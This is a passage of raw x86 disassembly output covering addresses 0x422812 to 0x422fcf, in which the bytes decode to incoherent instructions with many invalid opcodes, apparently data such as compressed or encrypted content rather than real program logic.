  422812:	inc    ecx
  422813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422814:	popf   
  422815:	ror    BYTE PTR [edx+0x5ee09ea0],1
  42281b:	sbb    al,0x93
  42281d:	xlat   BYTE PTR ds:[ebx]
  42281e:	or     cl,BYTE PTR ss:[ebp+0x61]
  422822:	ss dec esp
  422824:	std    
  422825:	stos   BYTE PTR es:[edi],al
  422826:	mov    bl,BYTE PTR [eax-0x37573966]
  42282c:	mov    ds:0x45012a27,eax
  422831:	push   ds
  422832:	test   BYTE PTR [esi],dh
  422834:	in     al,dx
  422835:	mov    bh,0xd4
  422837:	add    eax,0x7ca4ba59
  42283c:	call   DWORD PTR [esi+ebx*4]
  42283f:	dec    ecx
  422840:	jg     0x4228a1
  422842:	dec    ecx
  422843:	cmc    
  422844:	inc    esi
  422845:	pop    es
  422846:	in     al,0xba
  422848:	xchg   edi,eax
  422849:	xor    DWORD PTR [eax+0x2c],eax
  42284c:	aad    0xe5
  42284e:	xor    eax,0x13259703
  422853:	mov    ah,0x5a
  422855:	add    edx,DWORD PTR [ecx+0x74]
  422858:	xor    eax,0x5b95b04f
  42285d:	ret    
  42285e:	mov    ah,0xc1
  422860:	jno    0x4228bd
  422862:	xor    BYTE PTR [eax-0x45],bl
  422865:	mov    ebx,0xd8aefba2
  42286a:	add    ecx,DWORD PTR [edx-0x24]
  42286d:	out    dx,al
  42286e:	adc    esp,DWORD PTR [esp+esi*4-0x44]
  422872:	sub    al,0xd5
  422874:	lds    eax,FWORD PTR [ecx+0x5789666c]
  42287a:	adc    BYTE PTR [edx+0x3f],bl
  42287d:	out    dx,al
  42287e:	ins    BYTE PTR es:[edi],dx
  42287f:	sbb    al,BYTE PTR [eax-0x72]
  422882:	pop    ebp
  422883:	mov    dh,0x34
  422885:	popa   
  422886:	into   
  422887:	or     al,0xf
  422889:	mov    ebp,DWORD PTR [ebx-0x76]
  42288c:	pop    es
  42288d:	xchg   DWORD PTR [ebp-0x2a],edi
  422890:	xor    al,0x80
  422892:	or     ebp,DWORD PTR [eax+0x3d]
  422895:	jle    0x42289d
  422897:	push   ds
  422898:	mov    ecx,0xcea11454
  42289d:	(bad)  
  42289e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42289f:	lds    edx,FWORD PTR [ebp+0x46]
  4228a2:	sub    esp,ebp
  4228a4:	add    al,BYTE PTR [ebx-0x2f65ee05]
  4228aa:	mov    ecx,0x93a2a57a
  4228af:	xor    eax,0x977e7702
  4228b4:	(bad)  
  4228b5:	or     ah,cl
  4228b7:	dec    ebx
  4228b8:	adc    dl,al
  4228ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228bb:	add    eax,0x917035e5
  4228c0:	inc    esi
  4228c1:	sub    edx,0x4d
  4228c4:	pop    ecx
  4228c5:	sub    al,0x9a
  4228c7:	or     BYTE PTR [ebx+0x1a],ch
  4228ca:	push   eax
  4228cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228cc:	cmp    BYTE PTR [ebx+edi*2+0x71f7f26b],ch
  4228d3:	mov    ebp,0xc4795546
  4228d8:	sbb    BYTE PTR [edi],ah
  4228da:	cmp    ah,0x9a
  4228dd:	clc    
  4228de:	push   ebx
  4228df:	xor    BYTE PTR [ebp+0x8],0x82
  4228e3:	mov    bl,0x8e
  4228e5:	xchg   edx,esp
  4228e7:	xchg   ebp,eax
  4228e8:	xchg   edi,eax
  4228e9:	mov    ecx,0x6f95b87d
  4228ee:	and    edx,DWORD PTR [eax-0x4a]
  4228f1:	push   cs
  4228f2:	lods   al,BYTE PTR ds:[esi]
  4228f3:	jp     0x42294d
  4228f5:	or     DWORD PTR [ecx+0x5ee36dbe],esi
  4228fb:	imul   eax,DWORD PTR [ecx+0x4a595bea],0xfffffff7
  422902:	jnp    0x4228a3
  422904:	mov    edx,0xd7572fc3
  422909:	pop    esp
  42290a:	stos   DWORD PTR es:[edi],eax
  42290b:	loope  0x422905
  42290d:	retf   0xe11b
  422910:	sub    edi,DWORD PTR [ecx+0x23]
  422913:	fld    TBYTE PTR ds:0x3a6a84c3
  422919:	inc    esi
  42291a:	add    DWORD PTR [edx-0x7e],edi
  42291d:	sbb    BYTE PTR [ebx+ebp*4+0x10],ah
  422921:	xor    eax,0x49f581fd
  422926:	mov    ds:0x9e179a49,eax
  42292b:	adc    dh,BYTE PTR [ecx]
  42292d:	pop    esp
  42292e:	not    DWORD PTR [edx]
  422930:	jecxz  0x42290d
  422932:	scas   al,BYTE PTR es:[edi]
  422933:	jecxz  0x42295a
  422935:	loopne 0x422937
  422937:	fnstsw WORD PTR [edx+0x66e6fe98]
  42293d:	out    0xfa,al
  42293f:	scas   al,BYTE PTR es:[edi]
  422940:	mov    dl,0xd3
  422942:	mov    BYTE PTR [ebx],al
  422944:	leave  
  422945:	inc    esp
  422946:	or     ecx,DWORD PTR [ecx+0x7b477d88]
  42294c:	dec    ebx
  42294d:	mov    ah,0x44
  42294f:	ret    
  422950:	fst    QWORD PTR [ebp-0x11]
  422953:	mov    dl,0x7d
  422955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422956:	jmp    0x43cdf0d3
  42295b:	inc    ecx
  42295c:	mov    eax,ebp
  42295e:	or     esp,esi
  422960:	(bad)  [esi-0x77]
  422963:	ret    0x79bb
  422966:	xchg   BYTE PTR [esi-0x17f15a9b],dh
  42296c:	popa   
  42296d:	loope  0x422901
  42296f:	jmp    0xb6475217
  422974:	push   cs
  422975:	stc    
  422976:	sti    
  422977:	cmp    edi,eax
  422979:	push   ebx
  42297a:	or     DWORD PTR [eax+ebp*4+0x6e],edi
  42297e:	les    edi,FWORD PTR [esi-0x3f]
  422981:	fdivr  DWORD PTR [ebx]
  422983:	or     esp,ecx
  422985:	fst    DWORD PTR [esp+eiz*8+0x27]
  422989:	fscale 
  42298b:	fwait
  42298c:	and    eax,edx
  42298e:	dec    ecx
  42298f:	sti    
  422990:	xchg   ebp,eax
  422991:	cmc    
  422992:	xor    BYTE PTR [edx-0x49311b00],0xe4
  422999:	pop    ecx
  42299a:	dec    esi
  42299b:	xchg   ebp,eax
  42299c:	sar    DWORD PTR [edx-0x71],cl
  42299f:	mov    edx,0x60cf24dc
  4229a4:	cmp    BYTE PTR [ecx+0x5c788391],dl
  4229aa:	pushf  
  4229ab:	inc    eax
  4229ac:	xchg   edx,eax
  4229ad:	pop    ebx
  4229ae:	mov    ebp,DWORD PTR [eax]
  4229b0:	retf   0x90cb
  4229b3:	adc    esi,edi
  4229b5:	dec    edi
  4229b6:	test   DWORD PTR [edi+eiz*1],edi
  4229b9:	js     0x4229e4
  4229bb:	cli    
  4229bc:	push   ss
  4229bd:	scas   al,BYTE PTR es:[edi]
  4229be:	mov    ch,0xc4
  4229c0:	mov    al,ds:0xb894ceb2
  4229c5:	pop    eax
  4229c6:	cmp    edx,ebx
  4229c8:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4229ca:	xor    al,0xe3
  4229cc:	sub    dl,cl
  4229ce:	add    BYTE PTR [eax-0x1e1eac94],cl
  4229d4:	sbb    bh,BYTE PTR [edi]
  4229d6:	dec    BYTE PTR [edi]
  4229d8:	ds adc cl,ch
  4229db:	std    
  4229dc:	pop    edx
  4229dd:	inc    ebx
  4229de:	fnstcw WORD PTR [ebx-0x6131fafd]
  4229e4:	js     0x4229b4
  4229e6:	inc    ebp
  4229e7:	pop    edi
  4229e8:	out    dx,eax
  4229e9:	stos   DWORD PTR es:[edi],eax
  4229ea:	mov    ah,0xdc
  4229ec:	pop    ebp
  4229ed:	add    ebx,DWORD PTR [eax]
  4229ef:	sbb    BYTE PTR [edi],ah
  4229f1:	sub    al,bl
  4229f3:	mov    edi,esp
  4229f5:	stc    
  4229f6:	xor    DWORD PTR [edx],ebx
  4229f8:	(bad)  
  4229f9:	jmp    0xcf500d71
  4229fe:	or     al,0x41
  422a00:	popa   
  422a01:	daa    
  422a02:	mov    WORD PTR [edx-0x5b68e954],ss
  422a08:	cmp    BYTE PTR [edx-0x3d],0x94
  422a0c:	(bad)  
  422a0e:	cld    
  422a0f:	jl     0x422a40
  422a11:	sbb    ch,BYTE PTR [ecx+0x39]
  422a14:	inc    ebp
  422a15:	cwde   
  422a16:	jmp    eax
  422a18:	xchg   esp,eax
  422a19:	mov    al,0xb1
  422a1b:	gs sub ebx,eax
  422a1e:	dec    edi
  422a1f:	add    DWORD PTR [ebx+ebp*1-0x42],ebx
  422a23:	jne    0x422a32
  422a25:	pop    edx
  422a26:	fs inc ebx
  422a28:	xchg   edi,eax
  422a29:	cwde   
  422a2a:	hlt    
  422a2b:	inc    ebp
  422a2c:	loop   0x422a39
  422a2e:	push   ds
  422a2f:	aad    0xf5
  422a31:	add    eax,0xaa694e6e
  422a36:	jnp    0x422a63
  422a38:	jmp    0x520a:0x827857d0
  422a3f:	jecxz  0x422a4a
  422a41:	sti    
  422a42:	push   0xd345f6a8
  422a47:	lds    esi,FWORD PTR [ecx+ebx*8-0x2fde236c]
  422a4e:	push   es
  422a4f:	jno    0x4229f3
  422a51:	push   edi
  422a52:	shl    DWORD PTR [eax+ebp*2],cl
  422a55:	adc    ch,BYTE PTR [eax+0x233e805a]
  422a5b:	idiv   BYTE PTR [ecx+0x241ce109]
  422a61:	fdivr  DWORD PTR [esi+0x40]
  422a64:	sti    
  422a65:	stos   DWORD PTR es:[edi],eax
  422a66:	outs   dx,BYTE PTR ds:[esi]
  422a67:	xor    DWORD PTR [eax-0x2abe7441],0xfffffffd
  422a6e:	(bad)  es:[ecx-0x267cec82]
  422a75:	ja     0x422a2c
  422a77:	sahf   
  422a78:	fmul   QWORD PTR [eax-0x48c4337]
  422a7e:	xlat   BYTE PTR ds:[ebx]
  422a7f:	jle    0x422a4b
  422a81:	aam    0x4b
  422a83:	push   es
  422a84:	inc    esp
  422a85:	les    edx,FWORD PTR [ebx]
  422a87:	aad    0x77
  422a89:	and    al,0xcb
  422a8b:	cmp    eax,0x9d9e2851
  422a90:	mov    al,ds:0xfa7bf393
  422a95:	dec    esp
  422a96:	test   al,0xed
  422a98:	sbb    ch,cl
  422a9a:	js     0x422a4e
  422a9c:	mov    ebx,edx
  422a9e:	test   eax,0x86128fd
  422aa3:	jmp    0x422ab3
  422aa5:	dec    ecx
  422aa6:	pop    edi
  422aa7:	nop
  422aa8:	xchg   ebp,eax
  422aa9:	leave  
  422aaa:	cmp    eax,0x94076a03
  422aaf:	pop    ss
  422ab0:	sub    eax,0xb74595bd
  422ab5:	sub    eax,DWORD PTR [eax]
  422ab7:	adc    BYTE PTR [edx],bh
  422ab9:	int    0x20
  422abb:	test   DWORD PTR [edx-0x154166d8],esp
  422ac1:	fild   QWORD PTR [ebx]
  422ac3:	xor    al,0x90
  422ac5:	jmp    0x7f93:0x5ba50359
  422acc:	jmp    0x160e:0x24107b73
  422ad3:	sbb    BYTE PTR [ebp+0x52],bh
  422ad6:	xor    BYTE PTR [esi+0x66],dh
  422ad9:	lods   eax,DWORD PTR ds:[esi]
  422ada:	inc    ebx
  422adb:	fdiv   DWORD PTR [esi+esi*4]
  422ade:	sub    al,0xfe
  422ae0:	or     al,0x7
  422ae2:	iret   
  422ae3:	add    eax,0x2eea192c
  422ae8:	shr    DWORD PTR ss:[edx-0x24],cl
  422aec:	mov    bl,0x83
  422aee:	add    BYTE PTR [esi+0x114dd50e],al
  422af4:	fidivr WORD PTR [ebp-0x71]
  422af7:	or     dl,ah
  422af9:	sbb    ebp,DWORD PTR [ebx-0x32]
  422afc:	fld    TBYTE PTR ds:0x3ac2038d
  422b02:	push   ecx
  422b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b04:	cdq    
  422b05:	int3   
  422b06:	and    DWORD PTR [ebx],edi
  422b08:	in     al,0xe8
  422b0a:	mov    BYTE PTR [ebx+0x19],ch
  422b0d:	inc    edx
  422b0e:	mov    eax,ds:0x29863dd5
  422b13:	and    BYTE PTR [edx-0x134e9114],dh
  422b19:	pop    ecx
  422b1a:	push   ss
  422b1b:	loop   0x422b46
  422b1d:	out    0xa7,al
  422b1f:	mov    cl,0xba
  422b21:	stos   DWORD PTR es:[edi],eax
  422b22:	push   esi
  422b23:	test   esi,esp
  422b25:	pop    ds
  422b26:	(bad)  
  422b27:	aam    0xe5
  422b29:	sub    BYTE PTR [eax+0x300b2a13],al
  422b2f:	xor    eax,0x8474ada1
  422b34:	pop    ebx
  422b35:	xchg   ebp,eax
  422b36:	arpl   di,bp
  422b38:	push   ss
  422b39:	pushf  
  422b3a:	and    DWORD PTR [edi-0xed46201],ecx
  422b40:	(bad)  
  422b41:	push   esp
  422b42:	shl    BYTE PTR [esi+0x20],cl
  422b45:	mov    al,ds:0x83effbf1
  422b4a:	ss fsubrp st(6),st
  422b4d:	xchg   esp,eax
  422b4e:	push   edi
  422b4f:	(bad)  
  422b50:	aad    0xf3
  422b52:	(bad)  [edi-0xd]
  422b55:	sar    DWORD PTR [eax-0x587458ae],1
  422b5b:	aad    0x32
  422b5d:	ins    DWORD PTR es:[edi],dx
  422b5e:	fcom   DWORD PTR [edi]
  422b60:	arpl   WORD PTR [ebx+eax*8+0x104b111e],cx
  422b67:	inc    ebp
  422b68:	mov    di,0x7918
  422b6c:	push   es
  422b6d:	mov    ah,dl
  422b6f:	add    eax,0xb326c2f3
  422b74:	mov    BYTE PTR [esi],dl
  422b76:	rcr    DWORD PTR [edi+0x0],cl
  422b7c:	add    BYTE PTR [eax],al
  422b7e:	add    BYTE PTR [eax],al
  422b80:	add    BYTE PTR [eax-0x43f64bd4],ah
  422b86:	cdq    
  422b87:	mov    ebp,0x52812ad
  422b8c:	xor    al,BYTE PTR [esi-0x4fd09800]
  422b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b93:	add    DWORD PTR [eax],eax
  422b95:	scas   eax,DWORD PTR es:[edi]
  422b96:	add    eax,DWORD PTR [eax]
  422b98:	add    BYTE PTR [ebp-0x10d27c7d],bl
  422b9e:	dec    edi
  422b9f:	xor    ecx,0xf6a687c
  422ba5:	fidiv  WORD PTR [edx]
  422ba7:	in     eax,0x6c
  422ba9:	pop    esp
  422baa:	test   dh,ch
  422bac:	pusha  
  422bad:	repz mov cl,0xc5
  422bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bb1:	retf   
  422bb2:	clc    
  422bb3:	jbe    0x422b55
  422bb5:	adc    edi,edx
  422bb7:	loop   0x422b6c
  422bb9:	out    0x36,eax
  422bbb:	add    ch,al
  422bbd:	ja     0x422c3c
  422bbf:	jmp    0x266c973b
  422bc4:	xchg   ebp,eax
  422bc5:	out    0x61,al
  422bc7:	or     DWORD PTR [eax-0x6],ecx
  422bca:	lds    edi,FWORD PTR [ebx+0x35]
  422bcd:	sub    al,0x9f
  422bcf:	add    eax,0x27f98d1b
  422bd4:	jg     0x422ba8
  422bd6:	push   0x5d
  422bd8:	add    ebx,DWORD PTR [edi]
  422bda:	popf   
  422bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bdc:	(bad)  
  422bdd:	icebp  
  422bde:	retf   
  422bdf:	hlt    
  422be0:	and    bl,BYTE PTR [ecx]
  422be2:	inc    edi
  422be3:	sub    ah,al
  422be5:	aam    0x8c
  422be7:	mov    WORD PTR [ebp-0x779f626d],ds
  422bed:	call   FWORD PTR [ebp-0x29]
  422bf0:	cli    
  422bf1:	call   0x1148e365
  422bf6:	or     ah,BYTE PTR [ebp+0x1ec60391]
  422bfc:	cmp    dh,BYTE PTR [eax+0x6bffc39b]
  422c02:	xchg   BYTE PTR [esi+0xb9be2fa],bh
  422c08:	bound  ecx,QWORD PTR [ebp+0x1]
  422c0b:	jg     0x422c42
  422c0d:	nop
  422c0e:	inc    ecx
  422c0f:	arpl   WORD PTR [edi-0x67],ax
  422c12:	inc    eax
  422c13:	mov    esi,0xbb4cdefb
  422c18:	call   DWORD PTR [eax+0x1c]
  422c1b:	pop    edi
  422c1c:	jmp    0x6b80:0xeb94f69e
  422c23:	retf   
  422c24:	and    BYTE PTR [ecx-0x2dc3a3d2],0xb3
  422c2b:	mov    DWORD PTR [edx],edx
  422c2d:	mov    bh,0xb5
  422c2f:	push   es
  422c30:	test   DWORD PTR [ebp+0x11],ecx
  422c33:	mov    ebp,DWORD PTR [ebp+0x50d0a760]
  422c39:	jne    0x422cae
  422c3b:	hlt    
  422c3c:	aam    0xb6
  422c3e:	pop    esi
  422c3f:	jo     0x422c23
  422c41:	call   0x41e3bbef
  422c46:	inc    esi
  422c47:	xchg   esi,eax
  422c48:	pushf  
  422c49:	mov    ds:0x7320bfd,al
  422c4e:	add    al,BYTE PTR [esi+0x29a8bead]
  422c54:	pushf  
  422c55:	mov    al,0xfd
  422c57:	test   DWORD PTR [ecx],0x99bbe538
  422c5d:	xchg   edx,eax
  422c5e:	aam    0x7b
  422c60:	test   DWORD PTR [ecx-0x35b3abc1],edx
  422c66:	ret    
  422c67:	mov    WORD PTR [ecx+0xe],?
  422c6a:	aaa    
  422c6b:	cld    
  422c6c:	jmp    0x9e538b17
  422c71:	adc    DWORD PTR [esi],esi
  422c73:	jnp    0x422c74
  422c75:	cli    
  422c76:	retf   0x43ec
  422c79:	sub    eax,0x3580bc2c
  422c7e:	or     dh,cl
  422c80:	pop    ebp
  422c81:	in     al,0x3c
  422c83:	cmp    dl,BYTE PTR [ebx+0x2c41d81b]
  422c89:	adc    eax,0xb4632a9f
  422c8e:	lds    esi,FWORD PTR [edi-0x5f682317]
  422c94:	cmp    ecx,DWORD PTR ds:0x279bd98d
  422c9a:	sub    DWORD PTR [eax],edi
  422c9c:	xor    BYTE PTR [eax+ebx*4],cl
  422c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ca0:	(bad)  
  422ca1:	loopne 0x422cb5
  422ca3:	xchg   edx,eax
  422ca4:	das    
  422ca5:	adc    cl,BYTE PTR [edx-0x3abf742d]
  422cab:	adc    BYTE PTR [esi+0x2f140fd6],al
  422cb1:	jmp    0x7c06:0xa332e69f
  422cb8:	mov    dh,BYTE PTR [ecx+0x63b553b]
  422cbe:	cli    
  422cbf:	mov    ds:0x95f70afe,eax
  422cc4:	dec    edi
  422cc5:	jbe    0x422cb2
  422cc7:	test   bl,dl
  422cc9:	mov    ch,0xf2
  422ccb:	sar    DWORD PTR ds:0x6dd41f04,cl
  422cd1:	mov    db0,esi
  422cd4:	mov    BYTE PTR [edi-0x3d],ch
  422cd7:	out    dx,al
  422cd8:	mov    al,0xf0
  422cda:	and    dl,cl
  422cdc:	mov    bl,0x13
  422cde:	push   es
  422cdf:	mov    BYTE PTR [ecx-0x5],dl
  422ce2:	xor    bl,ah
  422ce4:	fiadd  WORD PTR [ebx]
  422ce6:	pop    eax
  422ce7:	mov    edx,esp
  422ce9:	cdq    
  422cea:	mov    ecx,0x8ec7e7d0
  422cef:	xchg   DWORD PTR [eax+0x7ba32af8],edx
  422cf5:	push   eax
  422cf6:	inc    edx
  422cf7:	call   0x7fb:0x45c0e8c8
  422cfe:	xor    BYTE PTR [ebx-0x2101944b],cl
  422d04:	sbb    DWORD PTR [ebx+ebx*2+0x62],0x3f78b9c4
  422d0c:	hlt    
  422d0d:	retf   
  422d0e:	aaa    
  422d0f:	cwde   
  422d10:	jl     0x422cb2
  422d12:	cs cmc 
  422d14:	fwait
  422d15:	ret    
  422d16:	cmp    esp,esp
  422d18:	push   esi
  422d19:	sub    DWORD PTR [ecx+0x17e22594],ebx
  422d1f:	xor    BYTE PTR [esi+0x33],ah
  422d22:	mov    esi,0x6e74759d
  422d27:	test   al,0x88
  422d29:	mov    ah,0x3d
  422d2b:	dec    edi
  422d2c:	in     al,0x4e
  422d2e:	mov    edi,0x2ae6449b
  422d33:	xor    BYTE PTR [esi-0x42],bl
  422d36:	imul   esp,DWORD PTR [eax],0xb42bcac6
  422d3c:	cwde   
  422d3d:	inc    ebx
  422d3e:	push   ds
  422d3f:	icebp  
  422d40:	adc    DWORD PTR [edi-0x6e687176],esp
  422d46:	arpl   bp,sp
  422d48:	and    edi,DWORD PTR [ecx+0x6ebd81b1]
  422d4e:	cmc    
  422d4f:	cmp    BYTE PTR ds:[edx],dl
  422d52:	xchg   ecx,eax
  422d53:	clc    
  422d54:	fs iret 
  422d56:	cwde   
  422d57:	pop    esp
  422d58:	ret    
  422d59:	(bad)  
  422d5a:	dec    eax
  422d5b:	adc    esp,edx
  422d5d:	fdivr  QWORD PTR [esi]
  422d5f:	xchg   edx,eax
  422d60:	mov    esi,DWORD PTR [esi]
  422d62:	push   eax
  422d63:	out    0xde,al
  422d65:	or     ah,ch
  422d67:	jbe    0x422de0
  422d69:	pop    edx
  422d6a:	pop    eax
  422d6b:	mov    WORD PTR [edi],ss
  422d6d:	mov    al,0x3a
  422d6f:	fxch   st(6)
  422d71:	mov    DWORD PTR ds:0x3b6f1453,ebx
  422d77:	addr16 push cs
  422d79:	pop    es
  422d7a:	gs push ebp
  422d7c:	popf   
  422d7d:	add    DWORD PTR [edi-0x60],esi
  422d80:	outs   dx,DWORD PTR ds:[esi]
  422d81:	cmp    BYTE PTR [edx],al
  422d83:	add    DWORD PTR [edx+0x7f5e7d96],0xffffffbb
  422d8a:	pop    esi
  422d8b:	ds jp  0x422d2d
  422d8e:	push   ebp
  422d8f:	imul   ebp,DWORD PTR [ecx+0x32f358ac],0xffffffd8
  422d96:	mov    ch,0x3e
  422d98:	xor    eax,0x28cc12fe
  422d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d9e:	fisttp WORD PTR [ecx+edx*2]
  422da1:	repz pop ss
  422da3:	xchg   esp,eax
  422da4:	pop    eax
  422da5:	inc    eax
  422da6:	mov    WORD PTR [edi+0x4ca79f76],ds
  422dac:	mov    cl,0x73
  422dae:	mov    edx,0xe8eee733
  422db3:	loopne 0x422dc8
  422db5:	int3   
  422db6:	pop    ss
  422db7:	pop    ds
  422db8:	dec    esp
  422db9:	mov    edi,0x5827abe6
  422dbe:	call   0x5bb9:0xd12dc7e9
  422dc5:	inc    eax
  422dc6:	jnp    0x422e05
  422dc8:	(bad)  
  422dc9:	fsubr  DWORD PTR [eax]
  422dcb:	stos   DWORD PTR es:[edi],eax
  422dcc:	pop    edi
  422dcd:	scas   al,BYTE PTR es:[edi]
  422dce:	fnstenv [eax+edx*1]
  422dd1:	push   edx
  422dd2:	or     DWORD PTR [edi+0x67],0x22
  422dd6:	js     0x422d69
  422dd8:	inc    esi
  422dd9:	push   edx
  422dda:	aaa    
  422ddb:	gs loop 0x422d82
  422dde:	cmp    edi,edi
  422de0:	mov    ds:0x4d6addd1,al
  422de5:	arpl   ax,dx
  422de7:	sub    DWORD PTR [ebp+0x459e291e],esp
  422ded:	jp     0x422dc0
  422def:	mov    BYTE PTR cs:[ebx],cl
  422df2:	mov    ds:0x4f6fc989,eax
  422df7:	mov    bl,0x62
  422df9:	xchg   ecx,eax
  422dfa:	ds push es
  422dfc:	ror    bh,1
  422dfe:	jge    0x422e29
  422e00:	cmovg  ebp,DWORD PTR [ebp-0x2c]
  422e04:	ret    0x5640
  422e07:	and    ecx,eax
  422e09:	xchg   esi,eax
  422e0a:	xchg   esi,eax
  422e0b:	mov    ds:0x5925e455,al
  422e10:	dec    eax
  422e11:	test   BYTE PTR [ebp-0x2d],ah
  422e14:	xchg   BYTE PTR [ebx+0x52],cl
  422e17:	or     al,0xd5
  422e19:	cld    
  422e1a:	xchg   ebp,eax
  422e1b:	stc    
  422e1c:	shl    BYTE PTR [ebx],0xbd
  422e1f:	dec    edi
  422e20:	sbb    edi,DWORD PTR ds:0x79856185
  422e26:	addr16 sbb al,0x42
  422e29:	loopne 0x422e60
  422e2b:	cwde   
  422e2c:	stos   BYTE PTR es:[edi],al
  422e2d:	push   ecx
  422e2e:	loop   0x422dfc
  422e30:	sub    DWORD PTR [ebx-0x54b02afe],edx
  422e36:	aaa    
  422e37:	das    
  422e38:	popf   
  422e39:	dec    DWORD PTR [esi+edi*1+0x228cb469]
  422e40:	cwde   
  422e41:	(bad)  
  422e42:	sub    dh,al
  422e44:	pop    esi
  422e45:	fcmovu st,st(6)
  422e47:	popf   
  422e48:	sub    ch,dl
  422e4a:	pop    ds
  422e4b:	mov    ecx,DWORD PTR ds:0xdbb25a30
  422e51:	inc    eax
  422e52:	and    dl,bl
  422e54:	cmp    al,0x96
  422e56:	stos   DWORD PTR es:[edi],eax
  422e57:	add    ebp,esp
  422e59:	xchg   DWORD PTR [esi+0x5f34b404],ecx
  422e5f:	adc    BYTE PTR [ecx+0x661b4410],cl
  422e65:	mov    eax,0x8d1eddfa
  422e6a:	cs jp  0x422e43
  422e6d:	sbb    DWORD PTR [edx+esi*2-0xab7b7b2],0xb2521d0b
  422e78:	fwait
  422e79:	(bad)  
  422e7a:	cmp    eax,0xd1648149
  422e7f:	out    dx,al
  422e80:	loope  0x422ef5
  422e82:	push   esp
  422e83:	into   
  422e84:	xchg   edx,eax
  422e85:	add    BYTE PTR [esi-0x24],ch
  422e88:	in     al,dx
  422e89:	xor    al,0x33
  422e8b:	mov    esi,0x4b2f644b
  422e90:	out    dx,eax
  422e91:	pop    edx
  422e92:	mov    ebx,0x7d6fe0eb
  422e97:	jne    0x422ebb
  422e99:	and    BYTE PTR [ecx+0x55bdb84f],0xcb
  422ea0:	pop    ds
  422ea1:	lahf   
  422ea2:	cmp    DWORD PTR [esp+esi*2-0x46],esi
  422ea6:	pop    ds
  422ea7:	outs   dx,DWORD PTR ds:[esi]
  422ea8:	xchg   BYTE PTR gs:[edx-0x771505d3],ah
  422eaf:	inc    edi
  422eb0:	rol    edi,1
  422eb2:	mov    DWORD PTR [edi],edx
  422eb4:	adc    eax,0x8414207c
  422eb9:	mov    dl,0xf7
  422ebb:	sbb    al,0x5e
  422ebd:	mov    al,0xc9
  422ebf:	imul   ebx,DWORD PTR [ebp-0x40],0x3c18be61
  422ec6:	shl    BYTE PTR [ebx],0xdb
  422ec9:	outs   dx,DWORD PTR fs:[esi]
  422ecb:	(bad)  
  422ecc:	mov    ebx,0xa015acc1
  422ed1:	cdq    
  422ed2:	stos   DWORD PTR es:[edi],eax
  422ed3:	test   BYTE PTR [ebp-0x1130fcc2],bl
  422ed9:	enter  0x457e,0x6e
  422edd:	loop   0x422ee7
  422edf:	mov    dl,0x3f
  422ee1:	mov    bl,0xb3
  422ee3:	push   ds
  422ee4:	cmp    bh,0xb6
  422ee7:	daa    
  422ee8:	ror    DWORD PTR [edx],cl
  422eea:	stos   BYTE PTR es:[edi],al
  422eeb:	push   cs
  422eec:	and    edi,eax
  422eee:	stos   BYTE PTR es:[edi],al
  422eef:	cmp    bh,dh
  422ef1:	dec    edx
  422ef2:	and    BYTE PTR [ebp+0x2ab44316],al
  422ef8:	lds    esp,FWORD PTR [ebp-0x488d4a0c]
  422efe:	lea    ebp,[ebp+ebp*4-0x724c1d0a]
  422f05:	(bad)  
  422f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f07:	cmp    dl,BYTE PTR [eax]
  422f09:	sub    dh,cl
  422f0b:	outs   dx,DWORD PTR ds:[esi]
  422f0c:	mov    ds:0x4e679009,al
  422f11:	push   ebp
  422f12:	data16 fcomp DWORD PTR [edx-0x7c]
  422f16:	lahf   
  422f17:	in     eax,dx
  422f18:	loopne 0x422f78
  422f1a:	dec    edx
  422f1b:	sbb    DWORD PTR [esi],edi
  422f1d:	out    dx,al
  422f1e:	ret    0x4d99
  422f21:	mov    cl,0x39
  422f23:	lds    ebx,FWORD PTR [bp+di-0x32]
  422f27:	stc    
  422f28:	test   eax,0xceaafcfb
  422f2d:	mov    ds:0x80463f72,eax
  422f32:	clc    
  422f33:	jae    0x422f80
  422f35:	loop   0x422f97
  422f37:	out    0x46,eax
  422f39:	mov    bl,0x60
  422f3b:	sti    
  422f3c:	add    al,0xab
  422f3e:	je     0x422f45
  422f40:	std    
  422f41:	or     BYTE PTR [eax-0x512973e5],0x49
	...
  422f50:	add    BYTE PTR [edx],al
  422f52:	xor    ecx,DWORD PTR [ebx-0x4c4744c8]
  422f58:	cmp    esi,DWORD PTR [esi+0x57b7ebde]
  422f5e:	or     bh,BYTE PTR [ebp+0xd]
  422f61:	pop    edi
  422f62:	test   al,0x1
  422f64:	add    BYTE PTR [edi+0xa000003],ch
  422f6a:	xor    eax,0xacca4d73
  422f6f:	pusha  
  422f70:	mov    cl,0xf6
  422f72:	nop
  422f73:	inc    eax
  422f74:	mov    eax,0x52121287
  422f79:	lock cmp DWORD PTR [ecx-0x67],0x784c01f7
  422f81:	xchg   esi,eax
  422f82:	mov    eax,ds:0x19d1d278
  422f87:	add    edx,edi
  422f89:	xor    BYTE PTR [eax-0x7957f292],dh
  422f8f:	push   ds
  422f90:	(bad)  
  422f91:	and    esi,DWORD PTR [ecx-0x2a]
  422f94:	push   0xe3407c24
  422f99:	int    0x1e
  422f9b:	push   0x93385ac5
  422fa0:	cmp    al,0x2c
  422fa2:	or     dl,cl
  422fa4:	lea    eax,[esp+ebx*8]
  422fa7:	pop    ss
  422fa8:	call   0x6e6f:0x1751877
  422faf:	daa    
  422fb0:	jmp    0x31980718
  422fb5:	mov    ah,0x6
  422fb7:	scas   eax,DWORD PTR es:[edi]
  422fb8:	sbb    BYTE PTR [ecx-0x328c44cc],cl
  422fbe:	mov    cl,BYTE PTR [edi]
  422fc0:	mov    ecx,ebp
  422fc2:	xchg   edx,eax
  422fc3:	dec    ecx
  422fc4:	loope  0x423045
  422fc6:	out    dx,al
  422fc7:	jb     0x422f8e
  422fc9:	sub    ebx,DWORD PTR [eax-0x27ad4715]
  422fcf:	mov    es,WORD PTR [edx+0x5170e3e5]
